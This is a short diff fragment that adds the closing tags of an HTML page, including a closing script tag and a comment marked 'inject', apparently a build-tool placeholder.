+</script>
+
+
+<!-- inject -->
+
+</div></body></html>
